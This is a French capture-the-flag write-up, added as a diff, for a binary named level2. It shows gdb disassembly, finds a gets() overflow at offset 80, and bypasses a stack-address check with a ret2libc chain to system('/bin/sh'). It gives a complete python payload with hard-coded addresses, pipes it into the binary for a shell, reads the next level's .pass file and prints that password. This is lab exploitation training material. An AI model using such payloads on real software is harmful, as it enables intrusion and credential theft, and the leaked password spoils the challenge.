@@ -1,0 +1,111 @@
+On a un fichier binaire level2.
+
+En l'executant on s'apercoit qu'il ouvre le stdin et attend une ecriture.
+Puis il réecrit ce qu'on a donné en argument et exit.
+
+Dans GDB on peut voir que le main appelle un fonction p:
+$ gdb level2
+(gdb) layout asm
+   │0x804853f <main>                push   %ebp                                │
+   │0x8048540 <main+1>              mov    %esp,%ebp                           │
+   │0x8048542 <main+3>              and    $0xfffffff0,%esp                    │
+   │0x8048545 <main+6>              call   0x80484d4 <p>                       │
+   │0x804854a <main+11>             leave                                      │
+   │0x804854b <main+12>             ret
+
+et que la fonction p appelle un get (que l'on sait vulnérable)
+(gdb) disas p
+  | ...
+  │0x80484ed <p+25>        call   0x80483c0 <gets@plt> 
+  | ...
+
+On donne le binaire à un décompileur.
+On voit que dans le programme, il y a un check qui permet d'exit le programme
+si on overflow ou qu'on se retrouve à une addresse non voulu:
+  if ( (retaddr & 0xB0000000) == 0xB0000000 )
+  {
+    printf("(%p)\n", v2);
+    _exit(1);
+  }
+(Generalement, lors d'un overflow, l'ecriture remonte dans le programme, jusqu'a la fonction précédent l'appelle du programme, un appel system dont l'addresse commence par 0xB)
+
+Ce qui correspond dans gdb a : 
+(gdb) disas p
+   | ...
+   │0x80484fb <p+39>        and    $0xb0000000,%eax                            │
+   │0x8048500 <p+44>        cmp    $0xb0000000,%eax                            │
+   │0x8048505 <p+49>        jne    0x8048527 <p+83>
+   | ...
+
+Après quelque recherche, on trouve rapidement qu'il existe une méthode, appelé retToLibc,
+qui permet de contrer ce check.
+En effet, puisqu'un retour directement vers un appelle systeme n'est pas envisageable, on va d'abord retourner vers une autre foncion autorisé, une fonction retour,
+qui elle ensuite pourra remonter vers un appelle systeme. Il faut ensuite donner l'argument à l'appelle systeme pour qu'il puisse executer ce que l'on souhaite : un shell
+
+On a donc besoin de :
+- l'offset ou le programme segfault
+- l'addresse de retour de p
+- l'addresse de system de la libc
+- l'addresse de la mention /bin/sh pour le donner en argument a system
+
+Pour l'offset on utilise la meme methode que le level précédent. grace a un générateur de caractère unique que l'on passe au programe de gdb,
+on obtient rapidement notre offset qui est de 80.
+
+Pour l'addresse de retour de la fonction p:
+(gdb) disas p
+    | ...
+    | 0x0804853e <+106>:	ret
+    | ...
+
+
+Il nous faut donc trouver l'adresse de la function system de la libc.
+Pour cela, on va dans gdb, et on lance le programme, avec un breakpoint pour l'empecher d'exit tout de suite, et on lance p system.
+$ gdb level2
+(gdb) b main
+(gdb) run
+(gdb) p system
+    $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+Notre fonction system se trouve a 0xb7e6b060
+
+Puis pour appeler system(/bin/sh), il nous faut aussi une addresse ou trouver "/bin/sh"
+Il est possible qu'il soit utilisé aussi dans la libc, on va donc chercher a l'interieur de notre programme avec gdb:
+On cherche d'abord ou commance le chargement de la libc, et ou il finit.
+(gdb) info proc map
+    process 5595
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+On voit que la libC chargé, dans laquelle se trouve peut être une mention à /bin/sh commence à  0xb7e2c000 et finit à 0xb8000000.
+On va donc utiliser la commande find de gdb pour chercher notre /bin/sh
+
+(gdb) find 0xb7e2c000, 0xb8000000, "/bin/sh"
+    0xb7f8cc58
+Il semble que notre bin/sh soit bien utilisé par notre libc et qu'il se trouve a 0xb7f8cc58
+On verifie quand meme: 
+(gdb) x/s 0xb7f8cc58
+    0xb7f8cc58:	 "/bin/sh"
+C'est bien cela.
+
+Maintenant que l'on a toutes nos addresse, il suffit de construire l'exploit:
+on va donc faire overflow, en ajoutant 80 bytes, puis rediriger vers le return de p, puis rediriger vers la fonction system, ensuite comme on aura
+overflow avec un caractere, il y aura 4 bytes de ce caractere dans la remonté des addresse, on va donc les passé, et enfin appeler l'argument bin/sh:
+$ python -c 'print 80*"A" + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1]' > /tmp/exploit
+$ cat /tmp/exploit - | ./level2
+    cat /home/user/level3/.pass
+        492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
